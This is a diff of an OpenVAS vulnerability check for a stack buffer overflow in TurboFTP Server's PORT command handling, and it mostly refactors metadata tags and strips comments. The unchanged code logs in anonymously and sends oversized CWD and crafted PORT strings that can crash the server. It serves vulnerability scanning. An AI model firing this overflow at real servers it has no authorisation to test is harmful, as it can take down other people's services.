@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_turboftp_server_port_cmd_bof_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
+# $Id: gb_turboftp_server_port_cmd_bof_vuln.nasl 10941 2018-08-13 14:33:26Z asteins $
 #
 # TurboFTP Server PORT Command Processing Buffer Overflow Vulnerability
 #
@@ -24,75 +24,53 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allow remote attackers to cause a
-stack-based buffer overflow via an overly long IP octet string.
-
-Impact Level: Application";
-
-tag_affected = "TurboFTP Server version 1.30.823";
-
-tag_insight = "A boundary error occurs during the parsing of an FTP port command,
-which will result in a stack-based buffer overflow.";
-
-tag_solution = "Update to version Versio 1.30 Build 826 or later,
-For updates refer to http://www.tbsoftinc.com/download.htm";
-
-tag_summary = "This host is running TurboFTP server and is prone to buffer
-overflow vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803105");
-  script_version("$Revision: 9352 $");
+  script_version("$Revision: 10941 $");
   script_bugtraq_id(55764);
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-13 16:33:26 +0200 (Mon, 13 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-10-22 18:55:24 +0530 (Mon, 22 Oct 2012)");
   script_name("TurboFTP Server PORT Command Processing Buffer Overflow Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/50595/");
-  script_xref(name : "URL" , value : "http://www.naked-security.com/nsa/236580.htm");
-  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/50595");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117571/turboftp_port.rb.txt");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/50595/");
+  script_xref(name:"URL", value:"http://www.naked-security.com/nsa/236580.htm");
+  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50595");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117571/turboftp_port.rb.txt");
   script_category(ACT_DENIAL);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
   script_family("Buffer overflow");
+  script_tag(name:"solution_type", value:"VendorFix");
   script_dependencies("secpod_ftp_anonymous.nasl");
   script_require_ports("Services/ftp", 21);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
+stack-based buffer overflow via an overly long IP octet string.
+
+Impact Level: Application");
+  script_tag(name:"affected", value:"TurboFTP Server version 1.30.823");
+  script_tag(name:"insight", value:"A boundary error occurs during the parsing of an FTP port command,
+which will result in a stack-based buffer overflow.");
+  script_tag(name:"solution", value:"Update to version Versio 1.30 Build 826 or later,
+For updates refer to http://www.tbsoftinc.com/download.htm");
+  script_tag(name:"summary", value:"This host is running TurboFTP server and is prone to buffer
+overflow vulnerability.");
   exit(0);
 }
 
 
 include("ftp_func.inc");
 
-## Variable Initialization
-soc = 0;
-soc1 = 0;
-pass = "";
-user = "";
-banner = "";
-port = 0;
-exp = "";
-login_details = "";
-
-## Get the default port of FTP
 port = get_kb_item("Services/ftp");
 if(! port){
   port = 21;
 }
 
-## check port status
 if(!get_port_state(port)){
   exit(0);
 }
 
-## Confirm the Application
 banner = get_ftp_banner(port:port);
 if(!banner || "TurboFTP Server" >!< banner){
   exit(0);
@@ -104,17 +82,14 @@ if(!soc){
   exit(0);
 }
 
-## Check for the user name and password
 user = get_kb_item("ftp/login");
 pass = get_kb_item("ftp/password");
 
-## Try for anomymous user
 if(!user){
   user = "anonymous";
   pass = "openvas@";
 }
 
-## Try to Login
 login_details = ftp_log_in(socket:soc, user:user, pass:pass);
 if(! login_details)
 {
@@ -122,7 +97,6 @@ if(! login_details)
   exit(0);
 }
 
-## Build the exploit
 exp = "CWD " + crap(3000) + "\r\n";
 
 data = "98,81,113,65,133,25,65,0,42,105,75,0,116,96,95,0,42,248,70,0,149,59," +
